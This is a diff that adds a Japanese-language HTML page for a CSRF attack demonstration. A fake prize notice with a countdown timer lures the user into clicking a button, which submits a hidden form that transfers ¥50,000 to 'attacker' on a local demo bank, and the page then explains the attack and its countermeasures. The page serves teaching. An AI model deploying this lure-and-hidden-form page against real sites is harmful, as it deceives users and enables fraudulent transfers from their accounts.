@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>キャンペーン当選のお知らせ</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      background: #fff;
+      border-radius: 16px;
+      padding: 2.5rem 2rem;
+      max-width: 480px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+    }
+    .badge {
+      display: inline-block;
+      background: #fef3c7;
+      color: #92400e;
+      padding: 0.3rem 1rem;
+      border-radius: 99px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      margin-bottom: 1rem;
+    }
+    h1 {
+      font-size: 1.5rem;
+      color: #1f2937;
+      margin-bottom: 0.5rem;
+    }
+    .prize {
+      font-size: 2.5rem;
+      font-weight: 800;
+      color: #dc2626;
+      margin: 1rem 0;
+    }
+    .description {
+      color: #6b7280;
+      font-size: 0.9rem;
+      line-height: 1.6;
+      margin-bottom: 1.5rem;
+    }
+    .claim-btn {
+      display: inline-block;
+      background: linear-gradient(135deg, #f59e0b, #ef4444);
+      color: #fff;
+      border: none;
+      padding: 1rem 3rem;
+      border-radius: 99px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.15s, box-shadow 0.15s;
+      box-shadow: 0 4px 15px rgba(239, 68, 68, 0.4);
+    }
+    .claim-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(239, 68, 68, 0.5);
+    }
+    .timer {
+      margin-top: 1rem;
+      color: #dc2626;
+      font-size: 0.85rem;
+      font-weight: 500;
+    }
+    .explanation {
+      display: none;
+      margin-top: 2rem;
+      background: #fef2f2;
+      border: 2px solid #dc2626;
+      border-radius: 12px;
+      padding: 1.5rem;
+      text-align: left;
+    }
+    .explanation h2 {
+      color: #dc2626;
+      font-size: 1rem;
+      margin-bottom: 0.75rem;
+    }
+    .explanation p, .explanation li {
+      color: #1f2937;
+      font-size: 0.85rem;
+      line-height: 1.7;
+    }
+    .explanation ol {
+      padding-left: 1.25rem;
+    }
+    .explanation code {
+      background: #fee2e2;
+      padding: 0.1rem 0.3rem;
+      border-radius: 3px;
+      font-size: 0.8rem;
+    }
+    .back-link {
+      display: inline-block;
+      margin-top: 1rem;
+      color: #1a56db;
+      font-size: 0.85rem;
+    }
+
+    /* 隠しフォーム（ユーザーには見えない） */
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div id="phase-trap">
+      <div class="badge">期間限定キャンペーン</div>
+      <h1>おめでとうございます！</h1>
+      <div class="prize">¥50,000</div>
+      <p class="description">
+        抽選の結果、あなたが当選しました！<br />
+        下のボタンをクリックして賞金をお受け取りください。
+      </p>
+      <button class="claim-btn" onclick="executeAttack()">
+        今すぐ受け取る
+      </button>
+      <div class="timer">残り時間: <span id="countdown">4:59</span></div>
+    </div>
+
+    <div id="phase-done" style="display:none;">
+      <div class="badge" style="background:#d1fae5;color:#065f46;">完了</div>
+      <h1>受け取り手続き完了！</h1>
+      <p class="description">
+        ...と見せかけて、あなたの口座から不正送金が実行されました。
+      </p>
+      <a class="back-link" href="http://localhost:3000/dashboard">
+        &larr; SecureBank に戻って残高を確認する
+      </a>
+    </div>
+
+    <div id="explanation" class="explanation">
+      <h2>何が起きたのか（CSRF 攻撃の解説）</h2>
+      <ol>
+        <li>あなたは SecureBank (<code>localhost:3000</code>) にログイン済みで、セッション Cookie を持っていました。</li>
+        <li>この攻撃者サイト (<code>localhost:8080</code>) にアクセスしました。</li>
+        <li>「今すぐ受け取る」をクリックすると、隠しフォームが SecureBank の送金 API (<code>/api/transfer</code>) に POST リクエストを送信しました。</li>
+        <li>ブラウザは localhost 宛のリクエストにセッション Cookie を自動的に付与するため、SecureBank はあなた本人からのリクエストだと判断しました。</li>
+        <li>結果、あなたの口座から <code>attacker</code> に ¥50,000 が送金されました。</li>
+      </ol>
+      <p style="margin-top:0.75rem;">
+        <strong>対策:</strong> CSRF トークン、SameSite Cookie 属性 (Strict)、Origin ヘッダーの検証などで防げます。
+      </p>
+    </div>
+  </div>
+
+  <!-- 攻撃用の隠しフォーム -->
+  <form
+    id="csrf-form"
+    action="http://localhost:3000/api/transfer"
+    method="POST"
+    target="csrf-frame"
+    class="hidden"
+  >
+    <input type="hidden" name="to" value="attacker" />
+    <input type="hidden" name="amount" value="50000" />
+  </form>
+  <iframe name="csrf-frame" class="hidden"></iframe>
+
+  <script>
+    // カウントダウンタイマー（演出用）
+    let seconds = 299;
+    setInterval(() => {
+      if (seconds <= 0) return;
+      seconds--;
+      const m = Math.floor(seconds / 60);
+      const s = String(seconds % 60).padStart(2, "0");
+      document.getElementById("countdown").textContent = m + ":" + s;
+    }, 1000);
+
+    function executeAttack() {
+      // 隠しフォームを送信（CSRF 攻撃の実行）
+      document.getElementById("csrf-form").submit();
+
+      // UI を切り替えて解説を表示
+      setTimeout(() => {
+        document.getElementById("phase-trap").style.display = "none";
+        document.getElementById("phase-done").style.display = "block";
+        document.getElementById("explanation").style.display = "block";
+      }, 500);
+    }
+  </script>
+</body>
+</html>
